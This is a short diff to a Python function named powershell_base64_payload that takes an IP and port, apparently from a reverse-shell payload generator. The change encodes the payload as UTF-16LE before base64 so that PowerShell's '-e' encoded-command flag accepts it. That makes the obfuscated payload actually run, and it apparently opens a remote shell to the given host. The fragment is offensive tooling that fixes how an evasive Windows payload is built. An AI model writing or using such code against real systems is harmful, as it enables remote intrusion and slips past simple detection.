@@ -41,7 +41,8 @@ def powershell_base64_payload(ip, port):
     prefix = plaintext_payload[:payload_index + len("powershell -e ")]
     suffix = plaintext_payload[payload_index + len("powershell -e "):]
 
-    encoded_suffix = base64.b64encode(suffix.encode()).decode()
+    utf16le_encoded_suffix = suffix.encode('utf-16le')
+    encoded_suffix = base64.b64encode(utf16le_encoded_suffix).decode()
 
     powershell_3_base64 = "[NO_DECODE]" + prefix + encoded_suffix
 
